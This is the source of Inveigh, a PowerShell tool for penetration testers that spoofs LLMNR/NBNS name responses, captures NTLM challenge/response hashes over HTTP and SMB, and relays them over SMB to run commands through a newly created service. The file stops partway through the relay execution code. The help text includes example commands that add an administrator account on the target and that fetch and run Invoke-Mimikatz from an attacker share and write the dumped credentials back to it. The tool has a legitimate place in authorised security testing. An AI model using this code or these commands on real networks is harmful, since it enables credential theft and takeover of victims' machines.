<#
.SYNOPSIS
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/SMB.

.DESCRIPTION
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to assist penetration testers that find themselves limited to a Windows system.
This can commonly occur while performing phishing attacks, USB drive attacks, VLAN pivoting, or simply being restricted to a Windows system as part of client imposed restrictions.

.PARAMETER IP
Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpoofIP' parameter is not set.

.PARAMETER SpooferIP
Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to another system. 

.PARAMETER HTTP
Default = Enabled: Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPS
Default = Disabled: Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.

.PARAMETER SMB
Default = Enabled: Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.

.PARAMETER LLMNR
Default = Enabled: Enable/Disable LLMNR spoofing.

.PARAMETER NBNS
Default = Disabled: Enable/Disable NBNS spoofing.

.PARAMETER NBNSTypes
Default = 20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name

.PARAMETER SMBRelay
Default = Disabled: Enable/Disable SMB relay.

.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.

.PARAMETER SMBRelayCommand
Command to execute on SMB relay target.

.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts either just the username of domain\username format. 

.PARAMETER SMBRelayAutoDisable
Default = Enable: Automaticaly disable SMB relay after a successful command execution on target.

.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.

.PARAMETER Repeat
Default = Enabled: Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.

.PARAMETER ForceWPADAuth
Default = Enabled: Matches Responder option to Enable/Disable authentication for wpad.dat GET requests. Disabling can prevent browser login prompts.

.PARAMETER Output
Default = Console/File Output Enabled: Enable/Disable most console output and all file output. 0 = Console Enabled/File Enabled, 1 = Console Enabled/File Disabled, 2 = Console Disabled/File Enabled

.PARAMETER OutputDir
Default = Working Directory: Set an output directory for log and capture files.

.PARAMETER RunTime
Set the run time duration in minutes. Note that leaving the Inveigh console open will prevent Inveigh from exiting once the set run time is reached. 

.EXAMPLE
./Inveigh.ps1
Execute with all default settings.

.EXAMPLE
./Inveigh.ps1 -IP 192.168.1.10
Execute specifying a specific local listening/spoofing IP.

.EXAMPLE
./Inveigh.ps1 -IP 192.168.1.10 -HTTP N
Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.

.EXAMPLE
./Inveigh.ps1 -Repeat N -ForceWPADAuth N
Execute with the stealthiest options.

.EXAMPLE
./Inveigh.ps1 -HTTP N -LLMNR N
Execute with LLMNR/NBNS spoofing disabled and challenge/response capture over SMB only. This may be useful for capturing non-Kerberos authentication attempts on a file server.

.EXAMPLE
./Inveigh.ps1 -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be useful for sending traffic to a controlled Linux system on another subnet.

.EXAMPLE
./inveigh.ps1 -smbrelay y -smbrelaytarget 192.168.2.55 -smbrelaycommand "net user test password /add && net localgroup administrators test /add"
Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  

.EXAMPLE
./inveigh.ps1 -smbrelay y -smbrelaytarget 192.168.2.55 -smbrelaycommand "powershell \\192.168.2.50\temp$\powermeup.cmd"
Execute with SMB relay enabled and using Mubix's powermeup.cmd method of launching Invoke-Mimikatz.ps1 and uploading output. In this example, a hidden anonymous share containing Invoke-Mimikatz.ps1 is employed on the Inveigh host system. 
Powermeup.cmd contents used for this example:
powershell "IEX (New-Object Net.WebClient).DownloadString('\\192.168.2.50\temp$\Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > \\192.168.2.50\temp$\%COMPUTERNAME%.txt 2>&1"
Original version:
https://github.com/mubix/post-exploitation/blob/master/scripts/mass_mimikatz/powermeup.cmd

.NOTES
1. An elevated administrator or SYSTEM shell is needed.
2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/SMB NTLMv1/NTLMv2 challenge/response capture.
3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
5. HTTP challenge/response captures are performed with a dedicated listener.
6. The local LLMNR/NBNS services do not need to be disabled on the host system.
7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
11. SMB relay support is experimental at this point, use caution if employing on a pen test.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Default parameter values can be modified below 
param
( 
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTPS="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMB="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$LLMNR="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="N",
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][array]$NBNSTypes="20",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelay="N",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="",
    [parameter(Mandatory=$false)][array]$SMBRelayUsernames,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
    [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
    [parameter(Mandatory=$false)][string]$SMBRelayCommand = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Repeat="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ForceWPADAuth="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Output="0",
    [parameter(Mandatory=$false)][int]$RunTime="",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
    [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(-not($IP))
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}

if(-not($SpooferIP))
{
    $SpooferIP = $IP  
}

if(-not($OutputDir))
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

$log_out_file = $output_directory + "\Inveigh-Log.txt"
$NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
$NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
$certificate_thumbprint = "76a49fd27011cf4311fb6914c904c90a89f3e4b2"
$hash = [hashtable]::Synchronized(@{})
$hash.IP_capture_list = @()
$hash.SMBRelay_failed_list = @()
$hash.host = $host
$hash.console_queue = New-Object System.Collections.ArrayList
$hash.log_file_queue = New-Object System.Collections.ArrayList
$hash.NTLMv1_file_queue = New-Object System.Collections.ArrayList
$hash.NTLMv2_file_queue = New-Object System.Collections.ArrayList
$hash.running = $true
$hash.SMB_relay_active_step = 0

# Write startup messages
$start_time = Get-Date
Write-Output "Inveigh started at $(Get-Date -format 's')"

if(($Output -eq 0) -or ($Output -eq 2))
{
    "$(Get-Date -format 's') - Inveigh started" |Out-File $log_out_file -Append
}

Write-Output "Listening IP Address = $IP"
Write-Output "LLMNR/NBNS Spoofer IP Address = $SpooferIP"

if($LLMNR -eq 'y')
{
    Write-Output 'LLMNR Spoofing Enabled'
    $LLMNR_response_message = "- spoofed response has been sent"
}
else
{
    Write-Output 'LLMNR Spoofing Disabled'
    $LLMNR_response_message = "- LLMNR spoofing is disabled"
}

if($NBNS -eq 'y')
{
    $NBNSTypes_output = $NBNSTypes -join ","
    
    if($NBNSTypes.Count -eq 1)
    {
        Write-Output "NBNS Spoofing Of Type $NBNSTypes_output Enabled"
    }
    else
    {
        Write-Output "NBNS Spoofing Of Types $NBNSTypes_output Enabled"
    }
    
    $NBNS_response_message = "- spoofed response has been sent"
}
else
{
    Write-Output 'NBNS Spoofing Disabled'
    $NBNS_response_message = "- NBNS spoofing is disabled"
}

if($HTTP -eq 'y')
{
    Write-Output 'HTTP Capture Enabled'
}
else
{
    Write-Output 'HTTP Capture Disabled'
}

if($HTTPS -eq 'y')
{
    try
    {
        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
        $certificate_store.open('ReadWrite')
        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
        $certificate.import($output_directory + "\inveigh.pfx")
        $certificate_store.add($certificate) 
        $certificate_store.close()
        Invoke-Expression -command "netsh http add sslcert ipport=0.0.0.0:443 certhash=$certificate_thumbprint appid='{00112233-4455-6677-8899-AABBCCDDEEFF}'" > $null
        Write-Output 'HTTPS Capture Enabled'
    }
    catch
    {
        $certificate_store.close()
        $HTTPS="N"
        Write-Output 'HTTPS Capture Disabled Due To Certificate Install Error'
    }
}
else
{
    Write-Output 'HTTPS Capture Disabled'
}

if($SMB -eq 'y')
{
    Write-Output 'SMB Capture Enabled'
}
else
{
    Write-Output 'SMB Capture Disabled'
}

if($SMBRelay -eq 'y')
{
    Write-Output 'SMB Relay Enabled'
    Write-Output "SMB Relay Target = $SMBRelayTarget"

    if($SMBRelayUsernames.Count -gt 0)
    {
        $SMBRelayUsernames_output = $SMBRelayUsernames -join ","
    
        if($SMBRelayUsernames.Count -eq 1)
        {
            Write-Output "SMB Relay Username = $SMBRelayUsernames_output"
        }
        else
        {
            Write-Output "SMB Relay Usernames = $SMBRelayUsernames_output"
        }
    }
    
    $hash.SMB_relay = $true
}
else
{
    Write-Output 'SMB Relay Disabled'
    $hash.SMB_relay = $false
}

if($SMBRelayAutodisable -eq 'y')
{
    Write-Output 'SMB Relay Auto Disable Enabled'
}
else
{
    Write-Output 'SMB Relay Auto Disable Disabled'
}

if($SMBRelayNetworkTimeout -ne '')
{
    Write-Output "SMB Relay Network Timeout = $SMBRelayNetworkTimeout Seconds"
}

if($Repeat -eq 'y')
{
    Write-Output 'Spoof Repeating Enabled'
}
else
{
    Write-Output 'Spoof Repeating Disabled'
}

if($ForceWPADAuth -eq 'y')
{
    Write-Output 'Force WPAD Authentication Enabled'
}
else
{
    Write-Output 'Force WPAD Authentication Disabled'
}

if($Output -eq 0)
{
    Write-Output 'Console Output Enabled'
    Write-Output 'File Output Enabled'
}
elseif($Output -eq 1)
{
    Write-Output 'Console Output Enabled'
    Write-Output 'File Output Disabled'
}
else
{
    Write-Output 'Console Output Disabled'
    Write-Output 'File Output Enabled'
}

if($RunTime -ne '')
{
    Write-Output "Run Time = $RunTime Minutes"
}

Write-Output "Output Directory = $output_directory"
Write-Warning "Press ENTER for console prompt"

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
$process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$hash.process_ID_bytes = $process_ID.Split(“-“) | FOREACH{[CHAR][CONVERT]::toint16($_,16)}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{
    Function DataToUInt16( $field )
    {
	   [Array]::Reverse( $field )
	   return [BitConverter]::ToUInt16( $field, 0 )
    }

    Function DataToUInt32( $field )
    {
	   [Array]::Reverse( $field )
	   return [BitConverter]::ToUInt32( $field, 0 )
    }

    Function DataLength
    {
        param ([int]$length_start,[byte[]]$string_extract_data)
        try{
            $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start+1)],0)
        }
        catch{}
        return $string_length
    }

    Function DataToString
    {
        param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)
        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }
}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]$payload_data)
        # SMB versions
        if ($payload_data[4] -eq 255)
        {
            $smb_version_offset = 0
        }
        elseif(($payload_data[4] -eq 254) -and ($payload_data[113] -eq 2))
        {
            $smb_version_offset = 27
        }
        else
        {
            $smb_version_offset = 29
        }
            
        if (($payload_data[(86 + $smb_version_offset)] -eq 2) -and ($payload_data[(87 + $smb_version_offset)..(89 + $smb_version_offset)] -eq 0))
        {
            $NTLM_challenge = [System.BitConverter]::ToString($payload_data[(102 + $smb_version_offset)..(109 + $smb_version_offset)]) -replace "-",""
        }

        return $NTLM_challenge
    }

    Function SMBNTLMResponse
    {
        param ([byte[]]$payload_data)
        # SMB versions
        if ($payload_data[4] -eq 255)
        {
            $SMB_version_offset = 0
            $NTLMv1_string_start = 147
            $NTLMv2_string_start = 151
        }
        else
        {
            $SMB_version_offset = 34
            $NTLMv1_string_start = 163
            $NTLMv2_string_start = 167
        }
            
        if (($payload_data[(87 + $SMB_version_offset)] -eq 3) -and ($payload_data[(88 + $SMB_version_offset)..(90 + $SMB_version_offset)] -eq 0))
        {
            $NTLMv2_offset = $payload_data[(103 + $SMB_version_offset)] + (79 + $SMB_version_offset)
                    
            $NTLMv2_length = DataLength (101 + $SMB_version_offset) $payload_data    
            $NTLMv2_domain_length = DataLength (107 + $SMB_version_offset) $payload_data
            $NTLMv2_domain_string = DataToString $NTLMv2_domain_length 0 0 ($NTLMv2_string_start + $SMB_version_offset) $payload_data
                            
            $NTLMv2_user_length = DataLength (115 + $SMB_version_offset) $payload_data
            $NTLMv2_user_string = DataToString $NTLMv2_user_length $NTLMv2_domain_length 0 ($NTLMv2_string_start + $SMB_version_offset) $payload_data
                            
            $NTLMv2_host_length = DataLength (123 + $SMB_version_offset) $payload_data
            $NTLMv2_host_string = DataToString $NTLMv2_host_length $NTLMv2_user_length $NTLMv2_domain_length ($NTLMv2_string_start + $SMB_version_offset) $payload_data

            $NTLMv2_response = [System.BitConverter]::ToString($payload_data[$NTLMv2_offset..($NTLMv2_offset + $NTLMv2_length - 1)]) -replace "-",""
            $NTLMv2_response = $NTLMv2_response.Insert(32,':')
            $NTLMv2_hash = $NTLMv2_user_string + "::" + $NTLMv2_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
                    
            if($source_IP -ne $IP)
            {      
                $hash.console_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLMv2_host_string):`n$NTLMv2_hash")
                $hash.console_queue.add("SMB NTLMv2 challenge/response written to ")
                $hash.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLMv2_domain_string\$NTLMv2_user_string captured from $source_IP($NTLMv2_host_string)")
                $hash.NTLMv2_file_queue.add($NTLMv2_hash)
            }
                    
            if (($hash.IP_capture_list -notcontains $source_IP) -and (-not $NTLMv2_user_string.EndsWith('$')) -and ($Repeat -eq 'n') -and ($source_IP -ne $IP))
            {
                $hash.IP_capture_list += $source_IP
            }
        }
        elseif (($payload_data[(83 + $SMB_version_offset)] -eq 3) -and ($payload_data[(84 + $SMB_version_offset)..(86 + $SMB_version_offset)] -eq 0))
        {
            $NTLMv1_offset = $payload_data[(99 + $SMB_version_offset)] + (51 + $SMB_version_offset)
            $NTLMv1_length = DataLength (95 + $SMB_version_offset) $payload_data
            $NTLMv1_length += $NTLMv1_length
                            
            $NTLMv1_domain_length = DataLength (103 + $SMB_version_offset) $payload_data
            $NTLMv1_domain_string = DataToString $NTLMv1_domain_length 0 0 ($NTLMv1_string_start + $SMB_version_offset) $payload_data
                          
            $NTLMv1_user_length = DataLength (111 + $SMB_version_offset) $payload_data
            $NTLMv1_user_string = DataToString $NTLMv1_user_length $NTLMv1_domain_length 0 ($NTLMv1_string_start + $SMB_version_offset) $payload_data
                            
            $NTLMv1_host_length = DataLength (119 + $SMB_version_offset) $payload_data
            $NTLMv1_host_string = DataToString $NTLMv1_host_length $NTLMv1_user_length $NTLMv1_domain_length ($NTLMv1_string_start + $SMB_version_offset) $payload_data
                            
            $NTLMv1_response = [System.BitConverter]::ToString($payload_data[$NTLMv1_offset..($NTLMv1_offset + $NTLMv1_length - 1)]) -replace "-",""
            $NTLMv1_response = $NTLMv1_response.Insert(48,':')
            $NTLMv1_hash = $NTLMv1_user_string + "::" + $NTLMv1_domain_string + ":" + $NTLMv1_response + ":" + $NTLM_challenge
                    
            if($source_IP -ne $IP)
            {    
                $hash.console_queue.add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLMv1_host_string):`n$NTLMv1_hash")
                $hash.console_queue.add("SMB NTLMv1 challenge/response written to ")
                $hash.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLMv1_domain_string\$NTLMv1_user_string captured from $source_IP($NTLMv1_host_string)")
                $hash.NTLMv1_file_queue.add($NTLMv1_hash)
            }
                    
            if (($hash.IP_capture_list -notcontains $source_IP) -and (-not $NTLMv1_user_string.EndsWith('$')) -and ($Repeat -eq 'n') -and ($source_IP -ne $IP))
            {
            $hash.IP_capture_list += $source_IP
            }
        }
    }
}

# SMB Relay Challenge ScriptBlock - gathers NTLM server challenge from relay target
$SMB_relay_challenge_scriptblock =
{
    Function SMBRelayChallenge
    {
        param ($SMB_relay_socket,$HTTP_request_bytes)

        if ($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_challenge_bytes = New-Object System.Byte[] 1024
        $i = 0
        
        :SMB_relay_challenge_loop while ($i -lt 2)
        {
            switch ($i)
            {
                0 {
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $hash.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00)
                }
                
                1 { 
                    $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 32)
                    $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 22)
                    $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 2)
                    $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length)
                    $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 34))
                    $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
                    $SMB_blob_length = $SMB_blob_length.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 45))
                    $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
                    $SMB_byte_count = $SMB_byte_count.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 104))
                    $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
                    $SMB_netbios_length = $SMB_netbios_length.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    [array]::Reverse($SMB_netbios_length)
                    
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
                        + $SMB_netbios_length`
                        + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $hash.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_blob_length`
                        + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                        + $SMB_byte_count`
                        + (0x60)`
                        + $SMB_length_1`
                        + (0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0)`
                        + $SMB_length_2`
                        + (0x30,0x3c,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2)`
                        + $SMB_length_3`
                        + (0x04)`
                        + $SMB_NTLMSSP_length`
                        + $HTTP_request_bytes`
                        + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
                }
            }

            $SMB_relay_challenge_stream.write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
            $SMB_relay_challenge_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_challenge_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_challenge_stopwatch = [diagnostics.stopwatch]::StartNew()
                
                while(!$SMB_relay_challenge_stream.DataAvailable)
                {
                    if($SMB_relay_challenge_stopwatch.elapsed -ge $SMB_relay_challenge_timeout)
                    {
                        $hash.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $hash.lof_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $hash.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break SMB_relay_challenge_loop
                    }
                }
            }
    
            $SMB_relay_challenge_stream.Read($SMB_relay_challenge_bytes, 0, $SMB_relay_challenge_bytes.length)

            $i++
        }
        
        return $SMB_relay_challenge_bytes
    }
}

# SMB Relay Response ScriptBlock - sends NTLM reponse to relay target
$SMB_relay_response_scriptblock =
{
    Function SMBRelayResponse
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_user_ID)
    
        $SMB_relay_response_bytes = New-Object System.Byte[] 1024
        if ($SMB_relay_socket)
        {
            $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 244)
        $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 248)
        $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 252)
        $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length - 256)
        $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 16))
        $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
        $SMB_blob_length = $SMB_blob_length.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 27))
        $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
        $SMB_byte_count = $SMB_byte_count.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 86))
        $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
        $SMB_netbios_length = $SMB_netbios_length.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [array]::Reverse($SMB_netbios_length)
        
        $j = 0
        
        :SMB_relay_response_loop while ($j -lt 1)
        {
            [Byte[]] $SMB_relay_response_send = (0x00,0x00)`
                + $SMB_netbios_length`
                + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                + $hash.process_ID_bytes`
                + $SMB_user_ID`
                + (0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                + $SMB_blob_length`
                + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                + $SMB_byte_count`
                + (0xa1,0x82,0x01)`
                + $SMB_length_1`
                + (0x30,0x82,0x01)`
                + $SMB_length_2`
                + (0xa2,0x82,0x01)`
                + $SMB_length_3`
                + (0x04,0x82,0x01)`
                + $SMB_NTLMSSP_length`
                + $HTTP_request_bytes`
                + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
            
            $SMB_relay_response_stream.write($SMB_relay_response_send, 0, $SMB_relay_response_send.length)
        	$SMB_relay_response_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_response_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_response_stopwatch = [diagnostics.stopwatch]::StartNew()
                    
                while(!$SMB_relay_response_stream.DataAvailable)
                {
                    if($SMB_relay_response_stopwatch.elapsed -ge $SMB_relay_response_timeout)
                    {
                        $hash.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $hash.lof_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $hash.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break :SMB_relay_response_loop
                    }
                }
            }

            $SMB_relay_response_stream.Read($SMB_relay_response_bytes, 0, $SMB_relay_response_bytes.length)
            
            $hash.SMB_relay_active_step = 2
            
            $j++
        
        }
        return $SMB_relay_response_bytes
    }
}

# SMB Relay Execute ScriptBlock - executes command within authenticated SMB session
$SMB_relay_execute_scriptblock =
{
    Function SMBRelayExecute
    {
        param ($SMB_relay_socket,$SMB_user_ID)
    
        if ($SMB_relay_socket)
        {
            $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
        
        $SMB_service_random = [String]::Join("00-", (1..11 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
        $SMB_machine += '53-00-52-00-56-00-' + $SMB_service_random + '00-00-00'
        $SMB_service_name = $SMB_service_random + '00-00-00'
        $SMB_service_display = '49-00-56-00-53-00-52-00-56-00-' + $SMB_service_random + '00-00-00'
        [Byte[]]$SMB_machine_bytes = $SMB_machine.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [Byte[]]$SMB_service_bytes = $SMB_service_name.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [Byte[]]$SMB_service_display_bytes = $SMB_service_display.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        
        $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
        [System.Text.Encoding]::ASCII.GetBytes($SMBRelayCommand) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }
        $SMB_relay_command += '00-00'
        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        
        $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + 253)
        $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
        
        $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + 253 - 63)
        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]
        
        $SMB_relay_command_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length / 2)
        
        $k = 0

        :SMB_relay_execute_loop while ($k -lt 14)
        {
            switch ($k)
            {
            
                0 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31)`
                        + (0x30,0x2e,0x32,0x2e,0x31,0x30,0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00)
                }
                  
                1 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,0x18,0x02,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
